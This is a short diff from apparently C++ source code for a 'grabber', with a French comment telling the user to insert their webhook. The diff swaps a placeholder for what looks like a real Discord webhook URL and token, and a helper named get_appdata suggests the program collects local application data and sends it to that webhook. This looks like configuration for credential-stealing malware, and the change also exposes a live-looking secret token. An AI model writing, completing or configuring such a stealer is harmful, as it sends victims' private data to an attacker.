@@ -17,7 +17,7 @@ void run_grabber();
 // ============ CONFIG ============
 // mets ton webhook ici
 static const std::wstring WEBHOOK_URL =
-    L"https://discord.com/api/webhooks/XXXXXXXX/YYYYYYYY";
+    L"https://discord.com/api/webhooks/1557583844603994142/hlJQLms0JoNqDB4E6Js2asK0d5-kIfj3cr5GVW39yOZfNwcpxoh9aRdosLXV2GlzanyZ";
 // ================================
 
 std::string get_appdata() {
